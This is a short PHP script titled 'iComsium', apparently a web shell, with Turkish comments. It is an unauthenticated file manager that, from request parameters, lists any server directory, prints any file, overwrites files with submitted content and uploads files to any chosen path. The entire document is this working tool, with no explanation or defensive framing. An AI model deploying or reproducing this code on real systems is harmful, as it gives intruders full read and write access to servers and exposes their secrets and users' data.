iComsium
<?php
$root = __DIR__;
$style1 = 'color:#000;';
$style2 = 'color:#00a;font-weight:bold;';

function updir($ADir) {
    $ADir = rtrim($ADir, '/');
    $ADir = substr($ADir, 0, strrpos($ADir, '/'));
    return $ADir;
}

// === Dosya Kaydetme İşlemi ===
if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
    file_put_contents($_POST['edit_file'], $_POST['file_content']);
    echo "<p style='color:green'>Dosya kaydedildi: {$_POST['edit_file']}</p><hr>";
}

// === Dosya Yükleme İşlemi ===
if (isset($_FILES['upload_file'])) {
    $upload_path = isset($_POST['upload_path']) ? $_POST['upload_path'] : $root . '/';
    $target = $upload_path . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        echo "<p style='color:green'>Dosya yüklendi: {$target}</p><hr>";
    } else {
        echo "<p style='color:red'>Yükleme başarısız!</p><hr>";
    }
}

// === Dosya İçeriği Görüntüleme/Düzenleme ===
if (isset($_GET['edit']) && is_file($_GET['edit'])) {
    $content = htmlspecialchars(file_get_contents($_GET['edit']));
    echo "<h3>{$_GET['edit']} - Dosyasını Düzenle</h3>";
    echo "<form method='post'>
        <input type='hidden' name='edit_file' value='{$_GET['edit']}'>
        <textarea name='file_content' rows='20' style='width:100%;'>$content</textarea><br>
        <input type='submit' value='Kaydet'>
    </form><hr>";
    echo "<a href='?file=".dirname($_GET['edit'])."'>Geri Dön</a>";
    return;
}

// === Dizin Görüntüleme ===
if (isset($_GET['file'])) {
    if (is_file($_GET['file'])) {
        header("Content-type: text/plain");
        readfile($_GET['file']);
        return;
    }
    $path = $_GET['file'] . '/';
} else {
    $path = $root . '/';
}

echo "<strong>Root:</strong> $root<br>";
echo "<strong>Path:</strong> $path<hr>";
echo '<a href="?file=' . updir($path) . '">.. (Üst Dizin)</a><br />';

$p = $path . '*';
foreach (glob($p) as $file) {
    $style = is_file($file) ? $style1 : $style2;
    $link = is_file($file) ? '?file=' . $file : '?file=' . $file;
    $edit = is_file($file) ? ' - <a href="?edit=' . $file . '">[Düzenle]</a>' : '';
    echo '<a style="' . $style . '" href="' . $link . '">' . basename($file) . '</a>' . $edit . '<br />';
}

// === Dosya Yükleme Formu ===
echo '<hr><h3>Dosya Yükle</h3>';
echo '<form method="post" enctype="multipart/form-data">
    <input type="file" name="upload_file">
    <input type="hidden" name="upload_path" value="' . $path . '">
    <input type="submit" value="Yükle">
</form>';
